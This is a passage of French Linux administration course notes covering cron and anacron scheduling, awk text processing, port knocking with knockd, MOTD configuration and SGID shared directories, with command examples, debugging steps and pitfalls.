- `/etc/cron.daily/` : Scripts exécutés chaque jour
- `/etc/cron.weekly/` : Scripts exécutés chaque semaine
- `/etc/cron.monthly/` : Scripts exécutés chaque mois

**Utilisation** :
```bash
# Placer script exécutable dans dossier (pas d'extension, pas de .)
sudo cp backup.sh /etc/cron.daily/backup
sudo chmod +x /etc/cron.daily/backup

# Script exécuté automatiquement par anacron/cron
```

### Anacron vs Cron

**Cron** : Exécution précise à horaire fixe (suppose système allumé 24/7)  
**Anacron** : Exécution périodique (rattrape jobs manqués si système éteint)

**Anacron config** : `/etc/anacrontab`
```bash
# period delay job-identifier command
1  5  cron.daily  run-parts /etc/cron.daily
7  10 cron.weekly run-parts /etc/cron.weekly
@monthly 15 cron.monthly run-parts /etc/cron.monthly
```

**Usage** : Desktop/laptop (pas toujours allumé) → anacron préférable pour daily/weekly tasks

### Restrictions utilisateurs

**Fichiers contrôle** :
- `/etc/cron.allow` : Whitelist utilisateurs (si existe, seulement listés peuvent utiliser cron)
- `/etc/cron.deny` : Blacklist utilisateurs (si existe et pas cron.allow, listés ne peuvent pas utiliser cron)

**Logique** :
1. Si `cron.allow` existe : seulement users listés autorisés
2. Sinon, si `cron.deny` existe : tous autorisés sauf listés
3. Si aucun fichier : par défaut seulement root (RHEL) ou tous (Debian)

**Exemples** :
```bash
# Autoriser seulement admin et backup user
echo "admin" | sudo tee /etc/cron.allow
echo "backup" | sudo tee -a /etc/cron.allow

# Interdire user malicious
echo "malicious" | sudo tee /etc/cron.deny
```

### Use cases professionnels

**Backup quotidien** :
```bash
# /var/spool/cron/root
0 2 * * * /usr/local/bin/backup_databases.sh > /var/log/backup.log 2>&1
```

**Monitoring disque toutes les 15 minutes** :
```bash
*/15 * * * * /usr/local/bin/check_disk_space.sh
```

**Nettoyage fichiers temporaires (hebdomadaire)** :
```bash
0 3 * * 0 find /tmp -type f -mtime +7 -delete
```

**Rapport mensuel** :
```bash
0 9 1 * * /usr/local/bin/generate_monthly_report.sh
```

**Redémarrage service quotidien (workaround memory leak)** :
```bash
0 4 * * * systemctl restart myapp.service
```

### Debugging cron

**Problème : Cron job ne s'exécute pas** :

```bash
# 1. Vérifier service crond actif
sudo systemctl status crond

# 2. Vérifier syntaxe crontab
crontab -l    # Pas d'erreur affichée ?

# 3. Vérifier logs cron
sudo tail -50 /var/log/cron
# Rechercher : (username) CMD (commande)

# 4. Vérifier permissions script
ls -l /path/to/script.sh
# Doit être exécutable : chmod +x script.sh

# 5. Tester commande manuellement
/path/to/script.sh
# Erreur ? → problème script, pas cron

# 6. Vérifier PATH et environnement
# Ajouter en début script :
#!/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
source /etc/profile
```

**Problème : Pas de notification email** :

```bash
# 1. Vérifier MTA installé (postfix, sendmail)
systemctl status postfix

# 2. Installer mailx/mail
sudo yum install mailx -y

# 3. Tester envoi mail
echo "Test" | mail -s "Cron test" user@example.com

# 4. Vérifier MAILTO dans crontab
crontab -l | grep MAILTO
```

**Problème : Job exécuté deux fois** :

```bash
# Cause possible : job dans crontab user ET /etc/cron.d/
# Vérifier :
crontab -l
ls -l /etc/cron.d/
cat /etc/cron.d/*
```

### Logs et monitoring

**Logs RHEL/CentOS** :
```bash
sudo tail -f /var/log/cron
# Jan 07 14:35:01 server CROND[12345]: (root) CMD (/usr/local/bin/script.sh)
```

**Logs Debian/Ubuntu** :
```bash
sudo tail -f /var/log/syslog | grep CRON
# Jan  7 14:35:01 server CRON[12345]: (root) CMD (/usr/local/bin/script.sh)
```

**Journalctl** :
```bash
sudo journalctl -u crond -f           # RHEL
sudo journalctl -u cron -f            # Debian
sudo journalctl -u crond --since today
```

**Vérifier dernière exécution** :
```bash
# Ajouter date/heure dans script
echo "$(date): Script executed" >> /var/log/myscript.log
```

### Pitfalls

⚠️ **PATH minimal** : Scripts échouent car commandes non trouvées (`/usr/local/bin` absent) → définir PATH en début crontab ou script  
⚠️ **Chemins relatifs** : Cron exécute depuis `/root` ou home user → utiliser chemins absolus  
⚠️ **`%` non échappés** : `%` signifie newline en cron → échapper `\%` ou utiliser guillemets  
⚠️ **Emails non lus** : Cron envoie stdout/stderr par email (spam inbox) → rediriger `> /dev/null 2>&1` ou `MAILTO=""`  
⚠️ **crontab -r sans confirmation** : Supprime toute la crontab → utiliser `-i` (interactive) ou backup avant  
⚠️ **Noms fichiers /etc/cron.d/** : Pas de `.` ou extensions → `backup.sh` non exécuté, `backup` OK

---

## Module 24 : awk - Traitement texte avancé

### Concepts clés

**awk** : Langage de programmation pour traitement et analyse de texte ligne par ligne.
- Créé en 1977 par Aho, Weinberger, Kernighan (d'où le nom)
- Extrêmement puissant pour manipulation données tabulaires
- Pattern-matching et actions sur colonnes
- Mini-langage de programmation complet (variables, conditions, boucles, fonctions)

**Use case typique** : Traiter fichiers CSV, logs, sorties commandes, rapports texte.

### Syntaxe de base

```bash
awk 'pattern {action}' file
awk '{action}' file          # Pas de pattern = toutes lignes
awk 'pattern' file           # Pas d'action = print ligne
```

**Pipeline** :
```bash
command | awk 'pattern {action}'
cat file | awk '{print $2}'
```

### Variables spéciales

| Variable | Description |
|----------|-------------|
| `$0` | Ligne entière |
| `$1, $2, $n` | Colonne 1, 2, n (séparateur par défaut = espace/tab) |
| `NF` | Number of Fields (nombre de colonnes ligne courante) |
| `NR` | Number of Record (numéro ligne courante, global) |
| `FNR` | File Number of Record (numéro ligne dans fichier courant) |
| `FS` | Field Separator (séparateur champs, défaut espace/tab) |
| `OFS` | Output Field Separator (séparateur sortie, défaut espace) |
| `RS` | Record Separator (séparateur enregistrements, défaut newline) |
| `ORS` | Output Record Separator (séparateur sortie, défaut newline) |
| `FILENAME` | Nom du fichier en cours de traitement |

### Blocs spéciaux

| Bloc | Moment exécution | Usage |
|------|------------------|-------|
| `BEGIN { ... }` | Avant traitement lignes | Initialisation variables, headers |
| `{ ... }` | Pour chaque ligne | Traitement principal |
| `END { ... }` | Après toutes lignes | Affichage résultats finaux, totaux |

**Exemple complet** :
```bash
awk 'BEGIN {sum=0} {sum+=$2} END {print "Total:", sum}' file.txt
```

### Exemples pratiques

**Afficher colonnes spécifiques** :
```bash
awk '{print $2}' file.txt              # Colonne 2 uniquement
awk '{print $1, $3}' file.txt          # Colonnes 1 et 3
awk '{print $NF}' file.txt             # Dernière colonne
awk '{print $(NF-1)}' file.txt         # Avant-dernière colonne
awk '{print $0}' file.txt              # Ligne entière (équivalent cat)
```

**Calculer somme** :
```bash
awk '{sum+=$2} END {print sum}' file.txt
```

**Calculer moyenne** :
```bash
awk '{sum+=$2; count++} END {print sum/count}' file.txt
# Ou
awk '{sum+=$2} END {print sum/NR}' file.txt
```

**Moyenne avec troncature (pas arrondi)** :
```bash
awk '{sum+=$2} END {printf "%.2f\n", int(sum/NR*100)/100}' file.txt
# int(x*100)/100 tronque à 2 décimales
```

**Filtrer lignes** :
```bash
awk '$3 > 50' file.txt                      # Colonne 3 > 50
awk '/error/' file.txt                      # Lignes contenant "error"
awk '!/warning/' file.txt                   # Lignes NE contenant PAS "warning"
awk 'NR > 1' file.txt                       # Ignorer 1ère ligne (header)
awk 'NR >= 10 && NR <= 20' file.txt        # Lignes 10 à 20
awk 'length($0) > 80' file.txt             # Lignes > 80 caractères
```

**Conditions multiples** :
```bash
awk '$3 > 50 && $4 < 100' file.txt
awk '$2 == "active" || $2 == "pending"' file.txt
awk '$1 ~ /^user/ && $3 > 1000' file.txt    # Colonne 1 commence par "user" ET col 3 > 1000
```

**Formater sortie** :
```bash
awk '{printf "%-10s %5d\n", $1, $2}' file.txt
# %-10s : string alignée gauche, largeur 10
# %5d : entier aligné droite, largeur 5
# %10.2f : float largeur 10, 2 décimales
```

**Changer séparateur** :
```bash
awk -F: '{print $1, $3}' /etc/passwd         # Séparateur entrée = :
awk -F, '{print $2}' data.csv                # Séparateur = ,
awk -F'[ \t]+' '{print $1}' file.txt         # Regex : espaces/tabs multiples

# Changer séparateur sortie
awk -v OFS=, '{print $1, $2, $3}' file.txt   # Sortie séparée par ,
```

**Variables utilisateur** :
```bash
awk '{total+=$2} END {avg=total/NR; print "Average:", avg}' file.txt

awk 'BEGIN {threshold=100} $3 > threshold {print $0}' file.txt

awk -v limit=50 '$2 > limit' file.txt        # Variable passée en argument
```

**Compter occurrences** :
```bash
awk '{count[$2]++} END {for (key in count) print key, count[key]}' file.txt
# Compte occurrences colonne 2 (tableau associatif)
```

**Remplacer valeurs** :
```bash
awk '{gsub(/old/, "new"); print}' file.txt   # Remplacer "old" par "new" dans ligne
awk '{$3 = $3 * 1.1; print}' file.txt        # Augmenter colonne 3 de 10%
```

**Concaténation** :
```bash
awk '{print $1 " - " $2}' file.txt           # Concaténer avec séparateur custom
awk '{print $1$2}' file.txt                  # Concaténer sans espace
```

### Opérateurs

**Arithmétiques** :
- `+`, `-`, `*`, `/`, `%` (modulo), `^` (puissance)

**Comparaison** :
- `==`, `!=`, `<`, `>`, `<=`, `>=`

**Logiques** :
- `&&` (AND), `||` (OR), `!` (NOT)

**String/Regex** :
- `~` : match regex (`$1 ~ /pattern/`)
- `!~` : not match regex
- Concaténation : espace (ex: `$1 " " $2`)

**Assignation** :
- `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `^=`
- `++`, `--` (incrémentation/décrémentation)

### Fonctions intégrées

**String** :
```bash
length(s)           # Longueur string
substr(s, pos, len) # Substring (position 1-indexed)
tolower(s)          # Minuscules
toupper(s)          # Majuscules
gsub(r, s, t)       # Replace global regex r par s dans t (ou $0)
sub(r, s, t)        # Replace 1ère occurrence regex
split(s, a, fs)     # Split string s dans array a avec séparateur fs
```

**Math** :
```bash
int(x)              # Partie entière (troncature)
sqrt(x)             # Racine carrée
sin(x), cos(x)      # Trigonométrie (radians)
rand()              # Nombre aléatoire [0,1)
srand(x)            # Initialiser générateur aléatoire
```

**Exemples fonctions** :
```bash
awk '{print toupper($1)}' file.txt                    # Colonne 1 en majuscules
awk '{print substr($1, 1, 3)}' file.txt               # 3 premiers caractères col 1
awk '{print length($0)}' file.txt                     # Longueur chaque ligne
awk '{gsub(/[0-9]+/, "X"); print}' file.txt          # Remplacer nombres par X
```

### Tableaux associatifs

```bash
# Compter occurrences mots
awk '{for(i=1; i<=NF; i++) count[$i]++} END {for(w in count) print w, count[w]}' file.txt

# Somme par catégorie
awk '{sum[$1]+=$2} END {for(cat in sum) print cat, sum[cat]}' file.txt

# Vérifier existence clé
awk '{if ($1 in seen) print "Duplicate:", $1; seen[$1]=1}' file.txt
```

### Structures contrôle

**If/Else** :
```bash
awk '{if ($3 > 50) print "High"; else print "Low"}' file.txt
awk '{if ($2 == "error") status="ERR"; else if ($2 == "warn") status="WRN"; else status="OK"; print $1, status}' file.txt
```

**For loop** :
```bash
awk '{for(i=1; i<=NF; i++) print $i}' file.txt       # Print chaque colonne sur ligne séparée
awk 'BEGIN {for(i=1; i<=10; i++) print i}'            # Print 1 à 10
```

**While loop** :
```bash
awk '{i=1; while(i<=NF) {print $i; i++}}' file.txt
```

### Use cases professionnels

**Analyser logs Apache** :
```bash
awk '$9 == 404 {print $7}' access.log                 # URLs avec erreur 404
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10    # Top 10 IPs
awk '{sum+=$10} END {print sum/1024/1024 " MB"}' access.log           # Bande passante totale (bytes → MB)
```

**Traiter fichiers CSV** :
```bash
awk -F, 'NR>1 {sum+=$3} END {print sum}' sales.csv    # Somme colonne 3 (skip header)
awk -F, '{gsub(/"/, "", $2); print $1, $2}' file.csv  # Retirer guillemets colonne 2
```

**Statistiques système** :
```bash
ps aux | awk '{sum+=$4} END {print "Total Memory:", sum "%"}'         # Mémoire totale processus
df -h | awk '$5+0 > 80 {print $1, $5}'                                 # Partitions > 80% pleines
```

**Rapport formaté** :
```bash
awk 'BEGIN {printf "%-15s %-10s %5s\n", "User", "UID", "Shell"} {printf "%-15s %-10s %5s\n", $1, $3, $7}' /etc/passwd
```

**Extraction données** :
```bash
# Extraire adresses email
awk '{for(i=1;i<=NF;i++) if($i ~ /@/) print $i}' file.txt

# Convertir seconds en hh:mm:ss
awk '{h=int($1/3600); m=int(($1%3600)/60); s=$1%60; printf "%02d:%02d:%02d\n", h,m,s}' times.txt
```

### Debugging awk

**Afficher variables** :
```bash
awk '{print "NR=" NR, "NF=" NF, "$0=" $0}' file.txt
```

**Tracer exécution** :
```bash
awk 'BEGIN {print "Start"} {print "Line", NR ":", $0} END {print "Done"}' file.txt
```

**Tester expression** :
```bash
echo "test 123 data" | awk '{print $2}'    # Test rapide sur stdin
```

### Pitfalls

⚠️ **Colonnes vides** : `$2` peut être vide si < 2 colonnes → vérifier `NF >= 2`  
⚠️ **Division par zéro** : `{print $2/$3}` échoue si `$3 == 0` → ajouter condition `$3 != 0`  
⚠️ **Séparateur multi-caractères** : `-F` accepte regex, mais comportement peut surprendre (utiliser `-F'[ \t]+'` pour espaces/tabs multiples)  
⚠️ **Variables non initialisées** : Variables awk = 0 ou "" par défaut (pas d'erreur, résultats incorrects possibles)  
⚠️ **Regex POSIX vs Extended** : awk utilise Extended Regex par défaut (différent de grep basique)

---

## Module 25 : Port Knocking - Sécurité réseau

### Concepts clés

**Port Knocking** : Technique de sécurité réseau masquant des services (SSH, HTTP, etc.) derrière firewall, débloqués uniquement après envoi d'une séquence spécifique de paquets sur des ports prédéfinis.

**Analogie** : Comme frapper une séquence rythmique à une porte secrète (knock-knock-pause-knock → porte s'ouvre).

**Objectif** : Rendre services "invisibles" aux scans réseau (nmap, masscan) tout en permettant accès aux utilisateurs autorisés connaissant la séquence.

### Fonctionnement

**Étapes** :
1. Service critique (ex: SSH port 22) fermé par firewall (iptables/nftables)
2. Daemon `knockd` surveille paquets réseau sur ports spécifiques
3. Client envoie séquence de "knocks" (SYN à ports définis) : `knock server 1234 5678 9012`
4. Si séquence correcte → `knockd` modifie firewall (ouvre port SSH pour IP client)
5. Client se connecte au service (SSH accessible temporairement)
6. Après timeout/déconnexion → firewall referme port automatiquement

**Avantages** :
- Protection contre scans automatisés (port fermé = invisible à nmap)
- Réduction surface d'attaque (service inaccessible par défaut)
- Protection bruteforce (impossible tenter login si port fermé)
- Couche sécurité supplémentaire (combiné avec clés SSH, fail2ban)

**Inconvénients** :
- Sécurité par obscurité (pas cryptographie forte)
- Séquence sniffable (MITM peut observer knocks)
- Configuration complexe (maintenance, partage séquence)
- Pas de protection contre attaquant connaissant séquence

### Installation

```bash
# RHEL/CentOS/Rocky
sudo yum install knock knockd -y

# Debian/Ubuntu
sudo apt install knockd -y
```

**Packages** :
- `knock` : Client (envoyer knocks)
- `knockd` : Daemon serveur (écouter knocks, modifier firewall)

### Configuration serveur (knockd)

**Fichier** : `/etc/knockd.conf`

**Exemple config** :
```
[options]
    UseSyslog

[openSSH]
    sequence = 1234,5678,9012
    seq_timeout = 10
    command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn

[closeSSH]
    sequence = 9012,5678,1234
    seq_timeout = 10
    command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn
```

**Explications** :

| Paramètre | Description |
|-----------|-------------|
| `sequence` | Séquence ports à frapper (ordre important) |
| `seq_timeout` | Timeout max entre knocks (secondes) |
| `command` | Commande exécutée si séquence correcte |
| `%IP%` | Variable remplacée par IP client |
| `tcpflags` | Type paquets attendus (syn, fin, rst, ack) |
| `start_command` | Commande exécutée au démarrage knockd |
| `stop_command` | Commande exécutée à l'arrêt knockd |

**Séquences** :
- `openSSH` : Knock 1234 → 5678 → 9012 = ouvre SSH
- `closeSSH` : Knock 9012 → 5678 → 1234 = ferme SSH (séquence inverse)

**Activer knockd** :

```bash
# Éditer config
sudo vi /etc/default/knockd
# START_KNOCKD=1 (Debian/Ubuntu)

# Démarrer service
sudo systemctl enable --now knockd

# Vérifier statut
sudo systemctl status knockd
```

### Utilisation client (knock)

**Syntaxe** :
```bash
knock [options] <host> <port1> [port2] [port3] ...
```

**Exemples** :

```bash
# Knock TCP séquence simple
knock myserver.com 1234 5678 9012

# Knock UDP
knock -u myserver.com 5000

# Knock mix TCP/UDP
knock myserver.com 1234:tcp 5000:udp 9012:tcp

# Délai entre knocks (millisecondes)
knock -d 500 myserver.com 1234 5678 9012

# Verbose (afficher détails)
knock -v myserver.com 1234 5678 9012
```

**Options** :

| Option | Description |
|--------|-------------|
| `-u` | UDP knock (défaut = TCP) |
| `-d <ms>` | Délai entre knocks (millisecondes) |
| `-v` | Verbose mode |

**Workflow complet** :

```bash
# 1. Envoyer séquence ouverture SSH
knock myserver.com 1234 5678 9012

# 2. Se connecter immédiatement
ssh user@myserver.com

# 3. Après déconnexion, envoyer séquence fermeture (optionnel si timeout auto)
knock myserver.com 9012 5678 1234
```

### Configuration firewall

**Prérequis** : Firewall doit bloquer port service par défaut.

**iptables exemple** :

```bash
# Bloquer SSH par défaut
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# knockd ouvrira temporairement avec :
# iptables -A INPUT -s <IP_CLIENT> -p tcp --dport 22 -j ACCEPT

# Sauvegarder règles
sudo iptables-save > /etc/iptables/rules.v4
```

**firewalld alternative** :

```bash
# Bloquer SSH
sudo firewall-cmd --permanent --remove-service=ssh
sudo firewall-cmd --reload

# knockd utilise rich rules pour ouverture dynamique
```

### Sécurité avancée

**Timeout automatique** :
```
[openSSH]
    sequence = 1234,5678,9012
    seq_timeout = 10
    command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    cmd_timeout = 600    # Ferme port après 10 minutes
    stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

**Single-knock (pas séquence)** :
```
[openSSH]
    sequence = 7000
    seq_timeout = 5
    command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn
```

**Logging** :
```bash
# Voir knocks détectés
sudo tail -f /var/log/syslog | grep knockd
# knockd: myserver.com: openSSH: Stage 1
# knockd: myserver.com: openSSH: Stage 2
# knockd: myserver.com: openSSH: OPEN SESAME
```

### Use cases professionnels

**SSH serveur public** :
- Port 22 invisible aux scans automatisés
- Réduction drastique tentatives bruteforce
- Combinaison avec fail2ban, clés SSH, 2FA

**Services internes** :
- Web admin panels (port 8443 knocké)
- Bases de données (MySQL 3306, PostgreSQL 5432)
- APIs internes

**DMZ** :
- Serveurs DMZ accessibles uniquement après knock depuis réseau interne
- Couche sécurité réseau supplémentaire

### Debugging

**Problème : knockd ne démarre pas** :

```bash
# Vérifier config syntaxe
sudo knockd -c /etc/knockd.conf -D
# -D = debug mode, reste foreground

# Logs
sudo journalctl -u knockd -xe
```

**Problème : Knocks non détectés** :

```bash
# Vérifier interface réseau
sudo knockd -i eth0 -v
# Spécifier interface explicite

# Tcpdump vérifier paquets arrivent
sudo tcpdump -i eth0 port 1234 or port 5678 or port 9012
```

**Problème : Firewall pas modifié** :

```bash
# Vérifier permissions knockd
# knockd doit pouvoir exécuter iptables (root)

# Vérifier règles iptables
sudo iptables -L INPUT -v -n

# Tester commande manuellement
sudo /sbin/iptables -A INPUT -s 192.168.1.100 -p tcp --dport 22 -j ACCEPT
```

### Alternatives

**fwknop** : Single Packet Authorization (SPA)
- Chiffrement séquence (AES, GPG)
- Plus sécurisé que knockd (pas sniffable)
- Authentification cryptographique

**VPN** : OpenVPN, WireGuard
- Solution professionnelle recommandée
- Chiffrement fort, authentification mutuelle
- Complexité configuration supérieure

### Pitfalls

⚠️ **Séquence sniffable** : MITM peut observer knocks (pas chiffrement) → utiliser fwknop si critique  
⚠️ **Timeout trop court** : Connexion impossible si séquence envoyée trop lentement  
⚠️ **Firewall bloque knocks** : Router/firewall upstream doit autoriser ports knock  
⚠️ **Logs publics** : Ne jamais publier séquence knock dans documentation publique  
⚠️ **Lockout** : Mauvaise config peut bloquer accès total (garder console/IPMI backup)

---

## Module 26 : MOTD - Message of the Day

### Concepts clés

**MOTD** : Message of the Day - Texte affiché aux utilisateurs après authentification shell réussie (SSH, console locale).

**Usages** :
- Avertissements légaux (accès autorisé uniquement)
- Informations système (uptime, charge, mises à jour)
- Annonces maintenance planifiée
- Conseils sécurité / bonnes pratiques
- Banner corporate

**Différence Banner SSH vs MOTD** :

| Type | Fichier | Moment affichage | Usage |
|------|---------|------------------|-------|
| Banner pré-auth | `/etc/issue.net` | Avant authentification SSH | Avertissement légal |
| Console banner | `/etc/issue` | Console locale avant login | Info système |
| MOTD | `/etc/motd` | Après login réussi | Infos post-auth |

### Fichiers MOTD

**MOTD statique** : `/etc/motd`
- Contenu texte brut affiché tel quel
- Modification immédiate (prochaine connexion)
- Système universel (toutes distros Linux)

**MOTD dynamique** : `/etc/update-motd.d/` (Ubuntu/Debian)
- Scripts exécutés à chaque login
- Génèrent contenu dynamique (uptime, disk usage, updates, etc.)
- Sortie combinée → `/run/motd.dynamic`

**MOTD final** : Combinaison `/run/motd.dynamic` + `/etc/motd`

### Configuration MOTD statique

**Créer/Éditer** :
```bash
sudo vi /etc/motd
```

**Exemple contenu** :
```
*****************************************************
*                                                   *
*  Welcome to Production Server - stapp01           *
*                                                   *
*  Unauthorized access is prohibited.               *
*  All activities are logged and monitored.         *
*                                                   *
*****************************************************
```

**Application** : Immédiate (prochaine connexion SSH).

**Supprimer MOTD** :
```bash
sudo rm /etc/motd
# Ou vider
sudo truncate -s 0 /etc/motd
```

### MOTD dynamique (Ubuntu/Debian)

**Dossier scripts** : `/etc/update-motd.d/`

**Scripts par défaut** :
- `00-header` : Header système (distro, version)
- `10-help-text` : Aide liens documentation
- `50-landscape-sysinfo` : Infos système (Canonical Landscape)
- `50-motd-news` : News Ubuntu
- `80-esm` : Extended Security Maintenance
- `90-updates-available` : Mises à jour disponibles
- `91-release-upgrade` : Upgrade release disponible

**Ordre exécution** : Tri alphabétique (00, 10, 50, 90...).

**Créer script custom** :

```bash
sudo vi /etc/update-motd.d/50-custom-info
```

**Contenu exemple** :
```bash
#!/bin/sh
echo "===== System Information ====="
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime -p)"
echo "Load Average: $(uptime | awk -F'load average:' '{print $2}')"
echo "Users logged in: $(who | wc -l)"
echo "Disk Usage:"
df -h / | tail -1 | awk '{print "  /: " $3 " / " $2 " (" $5 " used)"}'
echo "=============================="
```

**Rendre exécutable** :
```bash
sudo chmod +x /etc/update-motd.d/50-custom-info
```

**Désactiver script** :
```bash
sudo chmod -x /etc/update-motd.d/10-help-text
# Ou renommer avec suffixe
sudo mv /etc/update-motd.d/10-help-text /etc/update-motd.d/10-help-text.disabled
```

**Tester manuellement** :
```bash
sudo run-parts /etc/update-motd.d/
# Exécute tous scripts, affiche sortie combinée
```

### Configuration SSH MOTD

**Fichier** : `/etc/ssh/sshd_config`

**Paramètres** :

| Paramètre | Valeur | Effet |
|-----------|--------|-------|
| `PrintMotd yes` | Défaut | Affiche MOTD après login |
| `PrintMotd no` | - | Supprime affichage MOTD |
| `Banner /etc/issue.net` | - | Affiche banner AVANT auth |
| `PrintLastLog yes` | Défaut | Affiche dernier login |

**Exemple config** :
```
# Banner pré-authentification
Banner /etc/issue.net

# MOTD post-authentification
PrintMotd yes
PrintLastLog yes
```

**Redémarrer SSH** :
```bash
sudo systemctl restart sshd
```

### Désactiver MOTD par utilisateur

**Fichier** : `~/.hushlogin`

```bash
touch ~/.hushlogin
```

**Effet** : Supprime MOTD + last login pour cet utilisateur uniquement (shell silencieux).

### Templates MOTD

**ASCII Art** :
```
  _____                _            _   _             
 |  __ \              | |          | | (_)            
 | |__) | __ ___   __| |_   _  ___| |_ _  ___  _ __  
 |  ___/ '__/ _ \ / _` | | | |/ __| __| |/ _ \| '_ \ 
 | |   | | | (_) | (_| | |_| | (__| |_| | (_) | | | |
 |_|   |_|  \___/ \__,_|\__,_|\___|\__|_|\___/|_| |_|
                                                      
          Server: app-prod-01
```

**Avertissement légal** :
```
*****************************************************
*                  AVERTISSEMENT                    *
*                                                   *
*  Ce système est la propriété de [Entreprise].    *
*  L'accès est réservé aux personnes autorisées.   *
*                                                   *
*  Toute tentative d'accès non autorisé sera       *
*  poursuivie conformément à la loi en vigueur.    *
*                                                   *
*  Toutes les activités sont surveillées et        *
*  enregistrées (logs, monitoring).                *
*****************************************************
```

**Info maintenance** :
```
========================================
  MAINTENANCE PLANIFIÉE
========================================

  Date: Samedi 15 janvier 2026
  Heure: 02h00 - 06h00 (UTC+1)
  Impact: Redémarrage serveur
  Services affectés: Web, API, DB

  Merci de planifier vos activités
  en conséquence.

========================================
```

### Use cases professionnels

**Conformité sécurité** :
- Bannières légales obligatoires (RGPD, politique interne)
- Traçabilité accès (mention logs, monitoring)
- Rappels bonnes pratiques

**Informations système** :
- Uptime, load, disk usage dynamiques
- Mises à jour disponibles (alerter admins)
- Version OS, kernel, services

**Communication équipe** :
- Annonces maintenances
- Changements configuration
- Nouveaux outils/procédures

**Onboarding** :
- Liens documentation interne
- Contacts support
- Commandes courantes rappel

### Debugging MOTD

**Problème : MOTD ne s'affiche pas** :

```bash
# 1. Vérifier fichier existe
ls -l /etc/motd
cat /etc/motd

# 2. Vérifier ~/.hushlogin absent
ls -la ~/.hushlogin

# 3. Vérifier config SSH
grep PrintMotd /etc/ssh/sshd_config
# PrintMotd yes

# 4. Tester login local (pas SSH)
su - username
# MOTD s'affiche ?

# 5. Vérifier PAM (Debian/Ubuntu)
grep pam_motd /etc/pam.d/sshd
# session    optional     pam_motd.so
```

**Problème : Scripts update-motd.d ne s'exécutent pas** :

```bash
# 1. Vérifier permissions exécution
ls -l /etc/update-motd.d/
# -rwxr-xr-x (x requis)

# 2. Exécuter manuellement pour voir erreurs
sudo run-parts /etc/update-motd.d/

# 3. Tester script individuellement
sudo /etc/update-motd.d/50-custom-info

# 4. Vérifier shebang
head -1 /etc/update-motd.d/50-custom-info
# #!/bin/sh ou #!/bin/bash

# 5. Logs erreurs
sudo journalctl -xe | grep motd
```

**Problème : Contenu tronqué** :

```bash
# Vérifier limites PAM
cat /etc/pam.d/login | grep pam_motd
# pam_motd.so motd=/etc/motd  # Pas de limite par défaut

# Scripts trop lents (timeout)
time sudo run-parts /etc/update-motd.d/
# > 5s peut causer timeout
```

### Pitfalls

⚠️ **Permissions /etc/motd** : Doit être world-readable (`chmod 644`) sinon non affiché  
⚠️ **Scripts update-motd.d non exécutables** : `chmod +x` obligatoire  
⚠️ **Ordre scripts** : Nommage `XX-name` détermine ordre (00 avant 99)  
⚠️ **PrintMotd=no** : MOTD désactivé même si fichiers existent  
⚠️ **Banner vs MOTD** : Banner affiché AVANT auth (légal), MOTD APRÈS (informatif) → ne pas confondre  
⚠️ **Scripts lents** : update-motd.d scripts lents retardent login → optimiser (< 1s par script recommandé)

---

## Module 27 : Permissions avancées - SGID et répertoires collaboratifs

### SGID (Set Group ID)

**Concept** : Bit de permission spécial forçant fichiers/sous-répertoires créés dans un répertoire à hériter du groupe propriétaire du répertoire parent (au lieu du groupe primaire de l'utilisateur créateur).

**Symbole** : `s` dans permissions groupe (ex: `drwxrws---`)

**Valeur numérique** : `2xxx` (2000 en octal)

### Syntaxe chmod SGID

**Symbolique** :
```bash
chmod g+s /path/to/directory       # Activer SGID
chmod g-s /path/to/directory       # Désactiver SGID
```

**Numérique (4 chiffres)** :
```bash
chmod 2770 /path/to/directory      # SGID + rwxrwx---
chmod 2775 /path/to/directory      # SGID + rwxrwxr-x
```

**Décomposition 2770** :
- `2` : SGID bit
- `7` : Owner permissions (rwx = 4+2+1)
- `7` : Group permissions (rwx = 4+2+1)
- `0` : Others permissions (aucun)

### Répertoires collaboratifs

**Use case** : Permettre à plusieurs utilisateurs (membres d'un groupe) de collaborer dans un répertoire partagé, avec tous les fichiers créés appartenant automatiquement au groupe du projet.

**Configuration standard** :

```bash
# 1. Créer répertoire projet
sudo mkdir -p /projects/team-alpha

# 2. Créer groupe projet (si n'existe pas)
sudo groupadd team-alpha

# 3. Ajouter utilisateurs au groupe
sudo usermod -aG team-alpha alice
sudo usermod -aG team-alpha bob
sudo usermod -aG team-alpha charlie

# 4. Changer groupe propriétaire
sudo chgrp -R team-alpha /projects/team-alpha

# 5. Activer SGID + permissions collaborative
sudo chmod 2770 /projects/team-alpha
# ou : chmod g+rwxs,u+rwx,o-rwx /projects/team-alpha

# 6. Vérifier
ls -ld /projects/team-alpha
# drwxrws--- 2 root team-alpha 4096 Jan 8 10:30 /projects/team-alpha
```

**Explication résultat** :
- `d` : Directory
- `rwxrws---` : Owner (rwx), Group (rws), Others (---)
- `s` dans groupe : SGID actif
- `team-alpha` : Groupe propriétaire

### Fonctionnement SGID

**Sans SGID** :
```bash
# alice (groupe primaire : alice) crée fichier
alice$ touch /shared/file.txt
alice$ ls -l /shared/file.txt
-rw-r--r-- 1 alice alice 0 Jan 8 10:30 file.txt
# Fichier appartient groupe primaire alice → bob (groupe bob) ne peut pas modifier
```

**Avec SGID** :
```bash
# Répertoire avec SGID activé (groupe team-alpha)
alice$ touch /projects/team-alpha/file.txt
alice$ ls -l /projects/team-alpha/file.txt
-rw-r--r-- 1 alice team-alpha 0 Jan 8 10:30 file.txt
# Fichier hérite groupe répertoire parent (team-alpha) → bob (membre team-alpha) peut modifier
```

### Permissions courantes collaborative directories

| Permissions | Numérique | Symbolique | Usage |
|-------------|-----------|------------|-------|
| `drwxrws---` | `2770` | `g+rwxs,u+rwx,o-rwx` | Collaboration stricte (groupe seul) |
| `drwxrwsr-x` | `2775` | `g+rwxs,u+rwx,o+rx` | Collaboration + lecture publique |
| `drwxrwsrwx` | `2777` | `g+rwxs,u+rwx,o+rwx` | Collaboration publique (dangereux) |

